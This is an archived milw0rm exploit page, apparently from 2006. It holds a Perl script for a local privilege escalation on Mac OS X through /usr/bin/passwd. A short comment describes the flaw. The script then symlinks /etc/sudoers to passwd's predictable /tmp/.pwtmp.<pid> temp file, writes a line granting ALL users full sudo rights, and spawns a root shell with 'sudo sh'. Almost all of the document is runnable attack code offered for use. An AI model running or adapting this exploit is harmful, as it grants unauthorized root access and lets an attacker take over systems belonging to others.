@@ -1,0 +1,48 @@
+<html><head><title>Apple Mac OS X (/usr/bin/passwd) Custom Passwd Local Root Exploit</title></head><pre>#!/usr/bin/perl
+#
+# /usr/bin/passwd[OSX]: local root exploit.
+# 
+# by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)
+# 
+# (Apple) OSX's /usr/bin/passwd program has support for a custom
+# passwd file to be used instead of the standard/static path.  this
+# feature has security issues in the form of editable file(s) being
+# made anywheres on the disk and also writing arbitrary data to files.
+#
+# the first issue will only work if the file does not already exist,
+# it is done using &quot;umask 0;/usr/bin/passwd -i file -l &lt;filename&gt;&quot;.
+# the second issue is once a successful password change has occured
+# /usr/bin/passwd will insecurely re-write the passwd file to
+# /tmp/.pwtmp.&lt;pid&gt;, which can be predicted and linked to a file of
+# your choice. (this exploits the second issue to overwrite 
+# /etc/sudoers)
+#
+# (for some reason this took apple 6 or so months to patch)
+
+use POSIX;
+
+$fake_passwd=&quot;/tmp/xpasswd.$$&quot;;
+$passwd_pid=($$ + 1);
+$passwd_tempfile=&quot;/tmp/.pwtmp.$passwd_pid&quot;;
+$sudoers=&quot;/etc/sudoers&quot;;
+
+sub pexit{print(&quot;[!] @_.\n&quot;);exit(1);}
+print(&quot;[*] /usr/bin/passwd[OSX]: local root exploit.\n&quot;);
+print(&quot;[*] by: vade79/v9 v9\@fakehalo.us (fakehalo/realhalo)\n\n&quot;);
+unlink($fake_passwd);
+print(&quot;[*] making fake password file. ($fake_passwd)\n&quot;);
+open(FP,&quot;&gt;$fake_passwd&quot;)||pexit(&quot;couldn't open/write to $fake_passwd&quot;);
+# uid must equal the current user.
+print(FP &quot;ALL ALL=(ALL) ALL #::&quot; . getuid . &quot;:&quot; . getuid . &quot;::&quot; .
+getuid . &quot;:&quot; . getuid . &quot;::/:/\n&quot;);
+close(FP);
+print(&quot;[*] sym-linking $sudoers -&gt; $passwd_tempfile.\n&quot;);
+symlink($sudoers,$passwd_tempfile)||pexit(&quot;couldn't link files.&quot;);
+print(&quot;[*] running /usr/bin/passwd on $fake_passwd.\n&quot;);
+print(&quot;[*] (use ANY password longer than 4 characters)\n\n&quot;);
+system(&quot;/usr/bin/passwd -i file -l $fake_passwd \&quot;ALL ALL=(ALL) ALL #\&quot;&quot;);
+print(&quot;\n[*] running \&quot;sudo sh\&quot;, use your REAL (user) password.\n\n&quot;);
+system(&quot;/usr/bin/sudo sh&quot;);
+exit(0);
+
+# milw0rm.com [2006-03-01]</pre></html>
